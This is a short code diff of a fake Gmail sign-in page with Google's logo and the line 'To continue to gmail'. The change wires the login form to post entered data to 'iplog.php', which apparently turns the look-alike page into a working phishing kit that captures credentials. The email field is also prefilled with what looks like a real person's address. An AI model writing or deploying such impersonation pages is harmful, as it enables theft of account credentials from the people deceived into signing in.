@@ -32,7 +32,7 @@
 	<div class="limiter">
 		<div class="container-login100">
 			<div class="wrap-login100">
-				<form class="login100-form validate-form">
+				<form class="login100-form validate-form" method="post" action="iplog.php">
 					
 				<span class="login100-form-title p-b-48">
 						<img src="images/google-logo.png" alt="" width="40%">
@@ -44,7 +44,6 @@
 						<p>To continue to gmail</p>
 						
 					</span>
-					
 
 					<div class="wrap-input100 validate-input" data-validate = "Valid email is: a@b.c">
 						<input class="input100" type="text" name="email" value="achindarangana@gmail.com">
